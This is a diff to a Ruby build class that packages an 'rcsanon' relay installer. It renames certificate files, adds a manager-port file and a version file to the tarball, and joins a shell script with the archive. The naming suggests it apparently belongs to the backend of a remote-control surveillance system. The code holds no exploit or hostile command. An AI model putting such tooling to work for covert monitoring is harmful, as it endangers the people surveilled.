@@ -22,9 +22,12 @@ class BuildAnon < Build
     trace :debug, "Build: melt #{params}"
 
     # take the files needed for the communication with RNC
-    FileUtils.cp Config.instance.cert('rcs.pem'), path('rcsanon/etc/rcs.pem')
-    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('rcsanon/etc/rcs-network.sig')
+    FileUtils.cp Config.instance.cert('rcs.pem'), path('rcsanon/etc/certificate')
+    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('rcsanon/etc/signature')
 
+    # the local port to listen on
+    File.open(path('managerport'), 'w') {|f| f.write params['port']}
+    
     # create the installer tar gz
     begin
       gz = Zlib::GzipWriter.new(File.open(path('install.tar.gz'), 'wb'))
@@ -33,10 +36,10 @@ class BuildAnon < Build
       h = {name: path('rcsanon/etc/rcsanon.conf'), as: 'rcsanon/etc/rcsanon.conf'}
       Minitar::pack_file(h, output)
 
-      h = {name: path('rcsanon/etc/rcs.pem'), as: 'rcsanon/etc/rcs.pem'}
+      h = {name: path('rcsanon/etc/certificate'), as: 'rcsanon/etc/certificate'}
       Minitar::pack_file(h, output)
 
-      h = {name: path('rcsanon/etc/rcs-network.sig'), as: 'rcsanon/etc/rcs-network.sig'}
+      h = {name: path('rcsanon/etc/signature'), as: 'rcsanon/etc/signature'}
       Minitar::pack_file(h, output)
 
       h = {name: path('rcsanon/sbin/rcsanon'), as: 'rcsanon/sbin/rcsanon', mode: 0755}
@@ -45,6 +48,12 @@ class BuildAnon < Build
       h = {name: path('rcsanon/tmp/errlog'), as: 'rcsanon/tmp/errlog'}
       Minitar::pack_file(h, output)
 
+      h = {name: path('version'), as: 'rcsanon/etc/version'}
+      Minitar::pack_file(h, output)
+
+      h = {name: path('managerport'), as: 'rcsanon/etc/managerport'}
+      Minitar::pack_file(h, output)
+      
     ensure
       output.close
     end
@@ -53,12 +62,12 @@ class BuildAnon < Build
     sh = File.binread(path('install.sh'))
     bin = File.binread(path('install.tar.gz'))
 
-    File.open(path('anon-install.sh'), 'wb') do |f|
+    File.open(path('anon-install'), 'wb') do |f|
       f.write sh
       f.write bin
     end
 
-    @outputs = ['anon-install.sh']
+    @outputs = ['anon-install']
   end
 
   def pack(params)
